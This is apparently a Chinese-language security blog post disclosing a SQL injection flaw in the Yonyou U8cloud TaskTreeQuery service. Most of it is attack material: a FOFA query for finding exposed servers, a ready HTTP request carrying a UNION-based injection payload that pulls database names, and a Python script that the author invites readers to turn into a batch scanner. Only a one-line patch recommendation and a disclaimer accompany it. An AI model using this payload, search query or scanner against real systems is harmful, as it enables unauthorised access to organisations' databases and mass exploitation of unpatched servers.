#  安全情报，X友 U8cloud task.TaskTreeQuery SQL注入漏洞！！   
原创 Ax  极星信安   2023-11-28 16:32  
  
**声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，禁止私自转载，如需转载，请联系作者！！！！  
  
请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关！！！！！  
  
**漏洞介绍**  
  
x友 U8cloud 部分版本 task.TaskTreeQuery 存在sql注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。  
  
**影响版本**  
```
用友U8cloud
```  
  
**漏洞情报**  
  
**fofa语句**  
```
app="用友U8cloud"
```  
  
**Poc**  
```
GET /service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=211'+UNION+all+SELECT+1,db_name(),3,4,5,6,7,8,9+from+master..sysdatabases--  HTTP/1.1

Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```  
  
**Poc验证工具**  
  
这里给个基础的demo，大佬们自己改成批量就可以了。  
```
import requests

# 输入目标IP和URL路径
target_ip = "your_target_ip"
url_path = "/service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=211'+UNION+all+SELECT+1,db_name(),3,4,5,6,7,8,9+from+master..sysdatabases--"
# 构建完整的URL
url = f"http://{target_ip}{url_path}"

# 定义请求头
headers = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
    "Accept": "*/*",
    "Connection": "Keep-Alive",
}

# 发送 GET 请求
response = requests.get(url, headers=headers)

# 检查响应状态码
if response.status_code == 200:
    print("验证成功")
else:
    print("验证失败")

```  
  
**修复建议**  
```
建议及时更新至最新版本！
```  
  
**关注我们**  
  
  
  
